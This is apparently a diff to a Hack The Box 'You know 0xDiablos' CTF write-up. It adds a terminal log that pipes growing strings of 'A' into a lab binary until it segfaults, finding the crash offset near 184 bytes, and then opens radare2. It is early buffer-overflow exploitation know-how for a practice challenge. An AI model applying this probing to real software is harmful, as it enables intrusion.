@@ -1,3 +1,53 @@
+```python
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ ./vuln       
+You know who are 0xDiablos: 
+asdasdasd
+asdasdasd
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*125)" | ./vuln 
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*225)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]    4377 done                python -c "print('A'*225)" | 
+       4378 segmentation fault  ./vuln
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*200)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]    4386 done                python -c "print('A'*200)" | 
+       4387 segmentation fault  ./vuln
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*190)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]    4391 done                python -c "print('A'*190)" | 
+       4392 segmentation fault  ./vuln
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*180)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*185" | ./vuln 
+You know who are 0xDiablos: 
+  File "<string>", line 1
+    print('A'*185
+                ^
+SyntaxError: unexpected EOF while parsing
+ ����
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*185)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]    4406 done                python -c "print('A'*185)" | 
+       4407 segmentation fault  ./vuln
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*183)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*184)" | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]    4414 done                python -c "print('A'*184)" | 
+       4415 segmentation fault  ./vuln
+```
+
+
+
 ```assembly
 ~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ r2 vuln
 [0x080490d0]> aaaa
